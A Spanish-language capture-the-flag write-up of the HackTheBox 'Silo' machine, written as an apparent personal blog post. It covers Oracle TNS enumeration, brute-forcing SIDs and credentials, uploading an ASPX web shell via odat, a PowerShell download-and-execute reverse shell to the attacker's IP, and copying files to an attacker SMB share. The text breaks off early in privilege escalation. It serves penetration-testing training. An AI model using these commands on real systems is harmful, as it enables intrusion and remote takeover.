---
layout      : post
title       : "HackTheBox - Silo"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/silo/131banner.png
category    : [ htb ]
tags        : [ volatility, file-upload, oracle, winrm, passthehash ]
---
Máquina Windows nivel medio, iremos de cabeza contra Oracle TNS, nos perderemos en un CVE :P, jugaremos con la base de datos y veremos que podemos ser los reyes de ella (**sysdba**), usaremos la herramienta **odat.py** pa (entre otras cositas) subir archivos, ¿qué subirías? Finalmente tendremos un volcán de memoria e.e del cual nos aprovecharemos para obtener los registros **SAM** y **SYSTEM** del sistema, lo demás son juegos de mesa.

![131siloHTB](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/silo/131siloHTB.png)

### TL;DR (Spanish writeup)

**Creada por**: [egre55](https://www.hackthebox.eu/profile/1190).

¡AJÁ como es entonceeeeeees!!

Bueeeno, inicialmente tendremos el servicio **Oracle TNS** y la herramienta `odat.py` que tiene muuuuuuuuuuuchos ataques contra ese servicio. Nos apoyaremos en él para poder subir cualquier tipo de archivo al sistema (todo mediante el parámetro **sysdba**), finalmente subiremos una web-Shell y así entablaremos una reverse Shell como el usuario `iis apppool\defaultapppool`.

Nos toparemos con un volcado de memoria del sistema, jugaremos con la herramienta `volatility` para encontrar procesos que se ejecutaron, rutas de los mismos y al final encontraremos las rutas de los registros, esto nos servirá para extraer las direcciones en memoria de los mismos y quedarnos con dos importantes: registro **SAM** y registro **SYSTEM**. Con ellos podremos dumpear los hashes de los usuarios del sistema, jugaremos con `evil-winrm` y `winexec` para hacer un **PassTheHash** contra el usuario **Administrator** y así conseguir una Shell como él en el sistema (:

#### Clasificación de la máquina

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/silo/131statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 90%;"/>

Bastante del lado real ;)

> Escribo para tener mis "notas", por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo plasmar lo que hice.

...

Soooooooooooooo, veremos:

1. [Enumeración](#enumeracion).
2. [Explotación](#explotacion).
4. [Escalada de privilegios](#escalada-de-privilegios).

...

## Enumeración [#](#enumeracion) {#enumeracion}

Veamos que servicios esta corriendo la máquina:

```bash
❭ nmap -p- --open -v 10.10.10.82 -oG initScan
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p-       | Escanea todos los 65535                                                                                  |
| --open    | Solo los puertos que están abiertos                                                                      |
| -v        | Permite ver en consola lo que va encontrando                                                             |
| -oG       | Guarda el output en un archivo con formato grepeable para usar una [función](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png) de [S4vitar](https://s4vitar.github.io/) que me extrae los puertos en la clipboard |

```bash
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: initScan
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Nmap 7.80 scan initiated Fri Apr 16 19:43:32 2021 as: nmap -p- --open -v -oG initScan 10.10.10.82
   2   │ # Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
   3   │ Host: 10.10.10.82 ()    Status: Up
   4   │ Host: 10.10.10.82 ()    Ports: 80/open/tcp//http///, 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 445/open/tcp//microsoft-ds///, 1521/open/tcp//oracle///, 5985/open/tcp//       │ wsman///, 47001/open/tcp//winrm///, 49152/open/tcp//unknown///, 49153/open/tcp//unknown///, 49154/open/tcp//unknown///, 49155/open/tcp//unknown///, 49159/open/tcp//unknown///, 491       │ 60/open/tcp//unknown///, 49161/open/tcp//unknown///, 49162/open/tcp/////
   5   │ # Nmap done at Fri Apr 16 19:56:42 2021 -- 1 IP address (1 host up) scanned in 789.59 seconds
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Entonces tenemos:

| Puerto | Descripción |
| ------ | :---------- |
| 80     | **[HTTP](https://searchnetworking.techtarget.com/definition/port-80)** |
| 135    | **[RPC](https://book.hacktricks.xyz/pentesting/135-pentesting-msrpc)** |
| 139    | **[SMB](https://www.varonis.com/blog/smb-port/)** |
| 445    | **[SMB](https://www.varonis.com/blog/smb-port/)** |
| 1521   | **[Oracle TNS](https://book.hacktricks.xyz/pentesting/1521-1522-1529-pentesting-oracle-listener)** |
| 5985   | **[winrm](https://docs.microsoft.com/en-us/windows/win32/winrm/installation-and-configuration-for-windows-remote-management)** |
| 47001  | **[winrm](https://docs.microsoft.com/en-us/windows/win32/winrm/installation-and-configuration-for-windows-remote-management)** |
| 49152, 49153, 49154, 49155, 49159, 49160, 49161, 49162 | Desconocidos |

Ahora hagamos un escaneo de scripts y versiones para tener info más especifica de cada puerto:

```bash
❭ extractPorts initScan 
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: extractPorts.tmp
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.10.82
   5   │     [*] Open ports: 80,135,139,445,1521,5985,47001,49152,49153,49154,49155,49159,49160,49161,49162
   6   │ 
   7   │ [*] Ports copied to clipboard
   8   │ 
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────
```

```bash
❭ nmap -p 80,135,139,445,1521,5985,47001,49152,49153,49154,49155,49159,49160,49161,49162 -sC -sV 10.10.10.82 -oN portScan
```

| Parámetro | Descripción |
| ----------|:----------- |
| -p        | Escaneo de los puertos obtenidos                       |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versión del servicio                |
| -oN       | Guarda el output en un archivo                         |

```bash
───────┬────────────────────────────────────────────────────────────────────────────────────────
       │ File: portScan
───────┼────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Nmap 7.80 scan initiated Fri Apr 16 25:25:25 2021 as: nmap -p 80,135,139,445,1521,5985,47001,49152,49153,49154,49155,49159,49160,49161,49162 -sC -sV -oN portScan 10.10.10.82
   2   │ Nmap scan report for 10.10.10.82
   3   │ Host is up (0.34s latency).
   4   │ 
   5   │ PORT      STATE SERVICE      VERSION
   6   │ 80/tcp    open  http         Microsoft IIS httpd 8.5
   7   │ | http-methods: 
   8   │ |_  Potentially risky methods: TRACE
   9   │ |_http-server-header: Microsoft-IIS/8.5
  10   │ |_http-title: IIS Windows Server
  11   │ 135/tcp   open  msrpc        Microsoft Windows RPC
  12   │ 139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
  13   │ 445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
  14   │ 1521/tcp  open  oracle-tns   Oracle TNS listener 11.2.0.2.0 (unauthorized)
  15   │ 5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
  16   │ |_http-server-header: Microsoft-HTTPAPI/2.0
  17   │ |_http-title: Not Found
  18   │ 47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
  19   │ |_http-server-header: Microsoft-HTTPAPI/2.0
  20   │ |_http-title: Not Found
  21   │ 49152/tcp open  msrpc        Microsoft Windows RPC
  22   │ 49153/tcp open  msrpc        Microsoft Windows RPC
  23   │ 49154/tcp open  msrpc        Microsoft Windows RPC
  24   │ 49155/tcp open  msrpc        Microsoft Windows RPC
  25   │ 49159/tcp open  oracle-tns   Oracle TNS listener (requires service name)
  26   │ 49160/tcp open  msrpc        Microsoft Windows RPC
  27   │ 49161/tcp open  msrpc        Microsoft Windows RPC
  28   │ 49162/tcp open  msrpc        Microsoft Windows RPC
  29   │ Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
  30   │ 
  31   │ Host script results:
  32   │ |_clock-skew: mean: 7m06s, deviation: 0s, median: 7m05s
  33   │ |_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
  34   │ | smb-security-mode: 
  35   │ |   account_used: guest
  36   │ |   authentication_level: user
  37   │ |   challenge_response: supported
  38   │ |_  message_signing: supported
  39   │ | smb2-security-mode: 
  40   │ |   2.02: 
  41   │ |_    Message signing enabled but not required
  42   │ | smb2-time: 
  43   │ |   date: 2021-04-17T01:19:28
  44   │ |_  start_date: 2021-04-17T00:48:33
  45   │ 
  46   │ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  47   │ # Nmap done at Fri Apr 16 25:25:25 2021 -- 1 IP address (1 host up) scanned in 147.56 seconds
───────┴────────────────────────────────────────────────────────────────────────────────────────
```

Obtenemos (varias cositas que veremos despues) por ahora:

| Puerto | Servicio | Versión |
| :----- | :------- | :------ |
| 135    | HTTP       | Microsoft IIS httpd 8.5                              |
| 135    | RPC        | Microsoft Windows RPC                                |
| 139    | SMB        | Microsoft Windows netbios-ssn                        |
| 445    | SMB        | Microsoft Windows Server 2008 R2 - 2012 microsoft-ds |
| 1521   | oracle-tns | Oracle TNS listener 11.2.0.2.0 (unauthorized)        |
| 5985   | winrm      | Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)              |
| 47001  | winrm      | Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)              |
| 49152  | msrpc      | Microsoft Windows RPC                                |
| 49153  | msrpc      | Microsoft Windows RPC                                |
| 49154  | msrpc      | Microsoft Windows RPC                                |
| 49155  | msrpc      | Microsoft Windows RPC                                |
| 49159  | oracle-tns | Oracle TNS listener (requires service name)          |
| 49160  | msrpc      | Microsoft Windows RPC                                |
| 49161  | msrpc      | Microsoft Windows RPC                                |
| 49162  | msrpc      | Microsoft Windows RPC                                |

Bueeeeno, parecen muchos puertos, pero realmente son pocos, Démosle a ver!

...

### Puerto 80 [⌖](#puerto-80) {#puerto-80}

Empezaremos revisando el servicio web. Si vamos al navegador y colocamos la IP, nos direcciona a:

![131page80](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/silo/131page80.png)

La pantalla por default del servidor **IIS** (Internet Information Services) como bien dice en la imagen :P

Haciendo fuzzing tampoco encontramos nada, así que por ahora no tenemos nada con respecto al servidor web.

...

### Puerto 135 (RPC) [⌖](#puerto-135) {#puerto-135}

> **MSRPC** (Microsoft Remote Procedure Call): Nos permite ejecutar procesos remotamente, pueden ser en otros sistemas o recursos compartidos en la red.

Apoyándonos de la herramienta `rpcclient` podemos intentar entrar a los recursos con credenciales nulas:

```bash
❭ rpcclient -U '' 10.10.10.82
Enter WORKGROUP\'s password: 
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
```

Pero nada :( Sigamos.

...

### Puerto 139-445 (SMB) [⌖](#puerto-139-445) {#puerto-139-445}

> **SAMBA**, en terminos generales nos permite compartir archivos (y otras cositas) entre usuarios de una misma red...

* [Más info sobre los puertos **139** y **445** de SAMBA](https://www.varonis.com/blog/smb-port/).

Veamos con que sistema estamos tratando fácilmente mediante `crackmapexec`:

```bash
❭ crackmapexec smb 10.10.10.82
SMB         10.10.10.82     445    SILO             [*] Windows Server 2012 R2 Standard 9600 x64 (name:SILO) (domain:SILO) (signing:False) (SMBv1:True)
```

* Windows Server 2012 :O

Probemos ahora con `smbclient` y `smbmap`, así validamos los recursos disponibles a los que podamos acceder (si es que podemos sin credenciales):

```bash
❭ smbclient -U '' -L //10.10.10.82
Enter WORKGROUP\'s password: 
session setup failed: NT_STATUS_LOGON_FAILURE
```

```bash
❭ smbmap -H 10.10.10.82 -u 'null'
[!] Authentication error on 10.10.10.82
```

Nada, así que sigamos viendo los puertos disponibles.

...

### Puerto 1521 (Oracle TNS) [⌖](#puerto-445-139) {#puerto-445-139}

> **Oracle DB** es una base de datos relacional.

* [Oracle Database](https://www.techopedia.com/definition/8711/oracle-database).

> **Oracle TNS (Transparent Network Substrate) Listener** según [unaaldia.hispasec](https://unaaldia.hispasec.com/2012/04/oracle-tns-poison-solucionada-4-anos-despues-grave-vulnerabilidad-remota-en-oracle-db.html), es el encargado de gestionar el establecimiento de las comunicaciones entre las distintas instancias de la base de datos, sus servicios y el cliente.

Perfectoo, no había tratado antes con este servicio, así que ta interesante.

Si recordamos nuestro escaneo con `nmap` vimos una versión para **Oracle TNS listener**. Versión `11.2.0.2.0`, buscando en internet **oracle tns listener 11.2.0.2.0 exploit** llegamos a esta guia para probar vulnerabilidades en el servicio:

* [Guia de pentesting sobre el servicio **Oracle TNS listener**](https://book.hacktricks.xyz/pentesting/1521-1522-1529-pentesting-oracle-listener).

Según la guía citada, vemos muchas maneras de empezar a jugar con este servicio, podemos volver a validar la versión mediante la herramienta `tnscmd10g`:

```bash
❭ tnscmd10g version -p 1521 -h 10.10.10.82
sending (CONNECT_DATA=(COMMAND=version)) to 10.10.10.82:1521
writing 90 bytes
reading
.e......"..Y(DESCRIPTION=(TMP=)(VSNNUM=186647040)(ERR=1189)(ERROR_STACK=(ERROR=(CODE=1189)(EMFI=4))))
```

Vemos la versión en formato decimal, jugando con `bc` (para conversión) y `echo` (como emitidor de valores) podemos entender la versión:

```bash
# Le indicamos que nos muestre el resultado en hexadecimal:
❭ echo "obase=16; 186647040" | bc
B200200
# Le indicamos que reciba un valor en hexadecimal y que sea convertido a valor decimal:
❭ echo "obase=10; ibase=16; B" | bc
11
```

Como resultado tendríamos: **11.2.0.2.0**, así que perfecto, vemos un error (creo) y también (creo :P) que nos responde el servicio.

* [Converto dec to hex - bash](https://stackoverflow.com/questions/378829/convert-decimal-to-hexadecimal-in-unix-shell-script).
* [Convert hex to dec - bash](https://linuxhint.com/convert_hexadecimal_decimal_bash/).

...

## Explotación [#](#explotacion) {#explotacion}

Siguiendo la guía, podemos enumerar **SID**s, que son las instancias que nos permiten conectarnos a las bases de datos del servicio. Lo que me da a entender que si no tenemos algún **SID** no podremos entrar o comunicarnos con ninguna DB. Leyendo encontramos que las instancias tendrán el mismo nombre que las bases de datos peeeero sin el dominio (jmm).

* [¿Qué significa **SID** en Oracle?](https://www.lawebdelprogramador.com/foros/Oracle/596788-que-significa-SID.html).

> The SID (Service Identifier) is essentially the database name. [Pentesting 1521](https://book.hacktricks.xyz/pentesting/1521-1522-1529-pentesting-oracle-listener).

Bien, podemos usar varias herramientas para hacer un brute force e intentar descubrir **SID**s disponibles, usaremos `hydra` con un wordlist (sids-oracle.txt) que nos probee la propia guía 🥰 :

```bash
❭ hydra -L sids-oracle.txt -s 1521 10.10.10.82 oracle-sid
[DATA] attacking oracle-sid://10.10.10.82:1521/
[1521][oracle-sid] host: 10.10.10.82
[1521][oracle-sid] host: 10.10.10.82   login: CLRExtProc
[1521][oracle-sid] host: 10.10.10.82   login: PLSExtProc
[1521][oracle-sid] host: 10.10.10.82   login: XE
1 of 1 target successfully completed, 4 valid passwords found
```

Bien, nos encuentra presuntamente 3 **SID**s válidos en el servicio, siguiendo la guía, ahora podríamos conectarnos a ellos, pero claro, nos faltan credenciales para usar :P

Podemos también realizar fuerza bruta para encontrar usuarios y contraseñas válidas contra cada **SID**, esto lo podemos hacer con la herramienta [odat.py](https://github.com/quentinhardy/odat) que tiene muuuuuuuuuuuuchas opciones para jugar contra bases de datos **Oracle**.

Acá estuve un buen rato intentando instalarla (por ciego), ya que `odat` necesita unas librerías de Oracle y para instalarlas la misma guía nos <guia> a "[Oracle pentesting requirement installation](https://book.hacktricks.xyz/pentesting/1521-1522-1529-pentesting-oracle-listener/oracle-pentesting-requirements-installation)" donde después de instalar las cosillas obtenemos dos cosas importantes:

* `sqlplus`, que nos servirá para conectarnos a la base de datos desde la consola.
* Que `odat.py` se ejecute sin problemas :)

> Si la guia inicial es confusa o cualquier cosa :P Les [paso otra que encontre un poco más detallada](https://dastinia.io/tutorial/2018/07/31/installing-oracle-database-attacking-tool-on-kali/) :)

Entonces, si nos dirigimos a la [Wiki](https://github.com/quentinhardy/odat/wiki) de `odat.py`, vemos como hacer fuerza bruta para encontrar usuarios basados en los **SID**:

![131google_odatWiki_usagewithSID](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/silo/131google_odatWiki_usagewithSID.png)

Probando con cada uno, el único que nos da resultado es el **SID -> XE**:

```bash
❭ python3 odat.py all -s 10.10.10.82 -p 1521 -d XE
[+] Checking if target 10.10.10.82:1521 is well configured for a connection...
[+] According to a test, the TNS listener 10.10.10.82:1521 is well configured. Continue...

[1] (10.10.10.82:1521): Is it vulnerable to TNS poisoning (CVE-2012-1675)?
[+] The target is vulnerable to a remote TNS poisoning

[2] (10.10.10.82:1521): Searching valid accounts on the XE SID
...
[+] Valid credentials found: scott/tiger. Continue...
...
```

Opa, vemos 2 cositas interesantísimas:

* Nos detecta que el servicio es vulnerable a un **CVE** llamado **CVE-2012-1675**, ya veremos de que trata.
* Encuentra credenciales válidas: usuario:`scott` con contraseña:`tiger`

Antes de profundizar en el **CVE** y ver si lo podemos explotar, veamos si las credenciales son válidas, nos apoyamos de la utilidad que instalamos antes, `sqlplus`:

```bash
❭ ./sqlplus scott/tiger@10.10.10.82/XE;

SQL*Plus: Release 21.0.0.0.0 - Production on Mon Apr 19 25:25:25 2021
Version 21.1.0.0.0

Copyright (c) 1982, 2020, Oracle.  All rights reserved.

ERROR:
ORA-28002: the password will expire within 7 days


Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

SQL> 
```

PerfecTOWOWowowowooooooooooooooooooo e.e tenemos credenciales validas contra el servicio y SID. En la guia nos indica que podemos probar si el usuario con el que entramos tiene permisos como administrador de la base de datos:

```bash
❭ ./sqlplus scott/tiger@10.10.10.82/XE 'as sysdba';

SQL*Plus: Release 21.0.0.0.0 - Production on Mon Apr 19 14:39:38 2021
Version 21.1.0.0.0

Copyright (c) 1982, 2020, Oracle.  All rights reserved.


Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

SQL>
```

* [How to list users in the Oracle DB](https://www.oracletutorial.com/oracle-administration/oracle-list-users/).
* [How to show all Oracle DB Privileges for a user](https://chartio.com/resources/tutorials/oracle-user-privileges--how-to-show-all-privileges-for-a-user/).

Opa, logramos entrar, asi que ahora si, veamos de que trata la vulnerabilidad a la que nos hacen referencia...

...

#### Validando CVE-2012-1675

![131google_cvedetails_cve20201675](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/silo/131google_cvedetails_cve20201675.png)

Podemos volver a validar si realmente es vulnerable con un script de `nmap`:

* [github.com/bongbongco/CVE-2012-1675 - Oracle TNS listener.nse (Tester vuln/not-vuln)](https://github.com/bongbongco/CVE-2012-1675).

```bash
❭ wget https://raw.githubusercontent.com/bongbongco/CVE-2012-1675/master/oracle-tns-poison.nse
❭ nmap -p 1521 --script=oracle-tns-poison 10.10.10.82 -oN tnsPoisonTester
...
Nmap scan report for 10.10.10.82

PORT     STATE SERVICE
1521/tcp open  oracle
|_oracle-tns-poison: Host is vulnerable!

```

Lito, tenemos claro que es vulnerable, ¿pero a qué? Bueno, leyendo sobre la vulnerabilidad nos indica que como atacantes podemos ejecutar comandos de base de datos por medio de una instalación de una base de datos/instancia/SID que ya exista, esto para efectuar un *Man-in-the-middle* para robar las conexiones que pasan por la base de datos.

* [Reporte oficial y completo de la vulnerabilidad](https://seclists.org/fulldisclosure/2012/Apr/204).
* [Oracle TNS Listener Envenamiento Remoto](https://shieldnow.co/2018/02/09/oracle-tns-listener-remote-poisoning/).
* [Vulnerabilidad crítica Oracle - CVE-2012-1675](https://blog.segu-info.com.ar/2012/05/vulnerabilidad-critica-y-parche-para.html).

...

Después de un rato jugando con la herramienta `odat.py` y su apartado llamado [**tnspoison**](https://github.com/quentinhardy/odat/wiki/tnspoison) que está relacionado con este CVE, no logramos hacerlo funcionar, lo ejecutamos, abrimos **Wireshark**, vemos los paquetes que pasan pero nada más.

```bash
❭ python3 odat.py tnspoison -s 10.10.10.82 -d XE --poison

[1] (10.10.10.82:1521): Local proxy on port 1522 and TNS poisoning attack to 10.10.10.82:1521 are starting. Waiting for connections...
```

Al darle a la ayuda propia del script vemos la opción `--sysdba`, la que permite ejecutar todos los procesos como administradores de la base de datos. Como vimos que anteriormente nos dejó entrar mediante `sqlplus` como **sysdba**, podríamos "volver a empezar" pero ahora con ese parámetro de más, quizás obtengamos nueva info.

El primero módulo (como lo dicen ellos) a usar con `odat.py` seria **all**, para validar que <modulos> están disponibles y empezar a jugar con la [Wiki](https://github.com/quentinhardy/odat/wiki/tnspoison) entre cada uno.

```bash
❭ python3 odat.py all -s 10.10.10.82 -p 1521 -d XE -U scott -P tiger --sysdba
[+] Checking if target 10.10.10.82:1521 is well configured for a connection...
[+] According to a test, the TNS listener 10.10.10.82:1521 is well configured. Continue...

[1] (10.10.10.82:1521): Is it vulnerable to TNS poisoning (CVE-2012-1675)?
[+] The target is vulnerable to a remote TNS poisoning

[2] (10.10.10.82:1521): Testing all authenticated modules on sid:XE with the scott/tiger account 
[2.1] UTL_HTTP library ?
[+] OK
[2.2] HTTPURITYPE library ?
[+] OK
[2.3] UTL_FILE library ?
[+] OK
[2.4] JAVA library ?
[-] KO
[2.5] DBMSADVISOR library ?
[+] OK
[2.6] DBMSSCHEDULER library ?
[+] OK
[2.7] CTXSYS library ?
[+] OK
[2.8] Hashed Oracle passwords ?
[+] OK
[2.9] Hashed Oracle passwords from history?
[+] OK
[2.10] DBMS_XSLPROCESSOR library ?
[+] OK
[2.11] External table to read files ?
[+] OK
[2.12] External table to execute system commands ?
[+] OK
[2.13] Oradbg ?
[-] KO
[2.14] DBMS_LOB to read files ?
[+] OK
[2.15] SMB authentication capture ?
[+] Perhaps (try with --capture to be sure)
[2.16] Gain elevated access (privilege escalation)?
[2.16.1] DBA role using CREATE/EXECUTE ANY PROCEDURE privileges?
[+] OK
[2.16.2] Modification of users' passwords using CREATE ANY PROCEDURE privilege only?
[-] KO
...
```

Vemos muchos **[+]** (sin `--sysdba` son todo **[-]**). Asi que bien, pues ahora seria irnos a la Wiki e ir recorriendo cada **[+]** y ver si nos es de utilidad...

```html
[2.3] UTL_FILE library ?
[+] OK
```

En el segundo **[+]** tenemos la libreria **UTL_FILE**, en la [Wiki](https://github.com/quentinhardy/odat/wiki/utlfile) tenemos:

![131google_odatWiki_utlfile](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/silo/131google_odatWiki_utlfile.png)

Que nos permite subir, descargar y borrar archivos relacionados con el sistema :o Probémoslo, subamos un archivo llamado `hola.txt`:

```bash
❭ cat hola.txt 
que lo ke mi perrito
```

Ejecutamos sin el argumento `--sysdba`, le indicamos que vamos a subir un archivo a la ruta `C:\Windows\System32\Temp` llamado `hola.txt` que lo tenemos en nuestra máquina con el nombre `hola.txt`:

```bash
❭ python3 odat.py utlfile -s 10.10.10.82 -p 1521 -d XE -U scott -P tiger --putFile 'C:\Windows\System32\Temp' hola.txt hola.txt

[1] (10.10.10.82:1521): Put the hola.txt local file in the C:\Windows\System32\Temp folder like hola.txt on the 10.10.10.82 server
[-] Impossible to put the hola.txt file: `ORA-01031: insufficient privileges`
```

Ahora como **sysdba**:

```bash
❭ python3 odat.py utlfile -s 10.10.10.82 -p 1521 -d XE -U scott -P tiger --sysdba --putFile 'C:\Windows\System32\Temp' hola.txt hola.txt

[1] (10.10.10.82:1521): Put the hola.txt local file in the C:\Windows\System32\Temp folder like hola.txt on the 10.10.10.82 server
[-] Impossible to put the hola.txt file: `ORA-29283: invalid file operation ORA-06512: at "SYS.UTL_FILE", line 536 ORA-29283: invalid file operation ORA-06512: at line 1`
```

e.e Cambia el error, pero es un error, probemos otra ruta temporal:

```bash
❭ python3 odat.py utlfile -s 10.10.10.82 -p 1521 -d XE -U scott -P tiger --sysdba --putFile 'C:\Windows\Temp' hola.txt hola.txt

[1] (10.10.10.82:1521): Put the hola.txt local file in the C:\Windows\Temp folder like hola.txt on the 10.10.10.82 server
[+] The hola.txt file was created on the C:\Windows\Temp directory on the 10.10.10.82 server like the hola.txt file
```

Perfecto (o pues eso parece :P), se subio el archivo :)

Sabiendo esto podemos intentar subir algo a la ruta en la que esta el servidor web, si buscamos la ruta por default en Windows tenemos:

![131google_default_pathWebServerWIN](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/silo/131google_default_pathWebServerWIN.png)

Probemos ahora con esa ruta y validemos despues en la web:

```bash
❭ python3 odat.py utlfile -s 10.10.10.82 -p 1521 -d XE -U scott -P tiger --sysdba --putFile 'C:\inetpub\wwwroot' hola.txt hola.txt

[1] (10.10.10.82:1521): Put the hola.txt local file in the C:\inetpub\wwwroot folder like hola.txt on the 10.10.10.82 server
[+] The hola.txt file was created on the C:\inetpub\wwwroot directory on the 10.10.10.82 server like the hola.txt file
```

Bien, la ruta existe, ahora validemosla:

![131page80_upfile_holaTXT_done](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/silo/131page80_upfile_holaTXT_done.png)

PERFECTOOOOOO, tenemos acceso a los archivos que subamos al servidor web... ¿Qué se te ocurre?

Pos sí, subamos una web Shell

...

#### Subiendo WebShell

Sabiendo que estamos ante un servidor web y que está siendo mantenido por **Microsoft ASP.NET**, hacemos una búsqueda rápida de que tipo de extensión permite ASP.NET y tenemos:

> **ASP.NET** es un entorno para aplicaciones web desarrollado y comercializado por Microsoft. Los formularios web están contenidos en archivos con una extensión **ASPX**.

Listos, buscando en el repo de [SecLists](https://github.com/danielmiessler/SecLists) encontramos varias web-shells, subiremos `cmd.aspx`:

```bash
❭ ls -la /opt/SecLists/Web-Shells/FuzzDB/
cmd.aspx        cmd.php         cmd-simple.php  list.php        nc.exe          up.php
cmd.jsp         cmd.sh          list.jsp        list.sh         reverse.jsp     up.sh
```

Ejecutamos:

```bash
❭ python3 odat.py utlfile -s 10.10.10.82 -p 1521 -d XE -U scott -P tiger --sysdba --putFile 'C:\inetpub\wwwroot' lawebshelltremenda.aspx cmd.aspx

[1] (10.10.10.82:1521): Put the cmd.aspx local file in the C:\inetpub\wwwroot folder like lawebshelltremenda.aspx on the 10.10.10.82 server
[+] The cmd.aspx file was created on the C:\inetpub\wwwroot directory on the 10.10.10.82 server like the lawebshelltremenda.aspx file
```

Validamos:

![131page80_upfile_webshell_done](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/silo/131page80_upfile_webshell_done.png)

Listos, tenemos ejecución remota de comandos :) Establezcamos una reverse Shell...

Nos ponemos en escucha por el puerto que queremos recibirla:

```bash
❭ nc -lvp 4433
listening on [any] 4433 ...
```

Generaremos una **PowerShell** mediante el repo [nishang](https://github.com/samratashok/nishang) que tiene muchas utilidades, entre ellas, shells:

```bash
❭ cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 .
❭ mv Invoke-PowerShellTcp.ps1 Itcp.ps1
```

Ahora modificaremos su contenido, tomaremos una cadena comentada y la moveremos al final del archivo sin comentarios, esto para que cuando hagamos la descarga del mismo mediante la web-shell lo interprete a la vez, por lo tanto leería los comandos para la reverse shell y se ejecutarían de una vez, dos pasos en uno ;)

Tomamos esta cadena del inicio:

```powershell
...
PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
...
```

La movemos al final con nuestra IP y puerto:

```powershell
...
}

Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.15 -Port 4433
```

Guardamos, creamos un servidor web rápidamente:

```bash
❭ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Y ahora ejecutamos en la web-shell:

```html
powershell -c "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.15:8000/Itcp.ps1');"
```

Recibimos una peticion en el servidor y despues de unos segundos:

![131bash_iss_revSH_done](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/silo/131bash_iss_revSH_done.png)

OPAAA, tamos dentro de la máquina, si si si ;) lindo, tenemos acceso a la flag del user.

> Finalmente no explotamos el CVE :( (lo intente con algunos poc pero no lo logre).

...

## Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

En el directorio de un usuario llamado **phineas** tenemos:

```powershell
PS C:\Users\Phineas\Desktop> ls 

    Directory: C:\Users\Phineas\Desktop

Mode                LastWriteTime     Length Name
----                -------------     ------ ----
-a---          1/5/2018  10:56 PM        300 Oracle issue.txt
-a---          1/4/2018   9:41 PM         32 user.txt

PS C:\Users\Phineas\Desktop>
```

```powershell
PS C:\Users\Phineas\Desktop> type "Oracle issue.txt"
Support vendor engaged to troubleshoot Windows / Oracle performance issue (full memory dump requested):

Dropbox link provided to vendor (and password under separate cover).

Dropbox link 
https://www.dropbox.com/sh/69skryzfszb7elq/AADZnQEbbqDoIf5L2d0PBxENa?dl=0

link password:
?%Hm8646uC$
```

Jmmm, parece ser una petición de un equipo a Oracle pidiendo un dump de memoria para encontrar algún error. Les responden con un link y una password para descargar lo que sea que tenga el link.

Pero si nos dirigimos al link y colocamos esa contraseña, falla, no la acepta :s Después de un rato intentando descargarlo desde Linux y buscando en internet, decidí movernos el archivo a nuestra máquina y ver que tipo de archivo es, así validamos si es que tiene algún truco, vemos esto:

Nos compartimos una carpeta mediante smb:

```bash
❭ smbserver.py smbFolder $(pwd) -smb2support
Impacket v0.9.22.dev1+20200909.150738.15f3df26 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Y lo transferimos:

```powershell
PS C:\Users\Phineas\Desktop> copy "Oracle issue.txt" \\10.10.14.15\smbFolder\Oracle.txt
```

Y:

```bash
❭ file Oracle.txt 
Oracle.txt: ISO-8859 text, with CRLF line terminators
```

```bash
